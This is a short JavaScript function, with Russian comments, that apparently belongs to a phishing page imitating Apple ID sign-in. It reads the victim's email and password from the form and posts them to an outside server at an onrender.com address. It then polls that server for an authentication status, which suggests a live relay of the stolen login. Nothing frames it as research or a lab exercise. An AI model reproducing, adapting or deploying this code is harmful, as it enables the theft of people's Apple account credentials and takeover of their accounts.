async function handleLogin() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;

    if (!email.includes('@')) return alert('Введите корректный Apple ID');

    // Генерируем ID сессии
    currentUserId = 'ID_' + Math.floor(Math.random() * 1000000);
    showStep('wait-step');

    try {
        const res = await fetch('https://sever-afk3.onrender.com/send-data', {
            method: 'POST',
            mode: 'cors', // Важно для запроса на другой домен
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: currentUserId, email, pass })
        });

        if (res.ok) {
            // Если сервер принял данные, начинаем опрос статуса
            pollInterval = setInterval(checkAuthStatus, 3000);
        } else {
            alert("Ошибка сервера. Загляните в логи Render.");
            showStep('auth-step');
        }
    } catch (err) {
        console.error("Ошибка:", err);
        alert("Не удалось достучаться до сервера.");
        showStep('auth-step');
    }
}


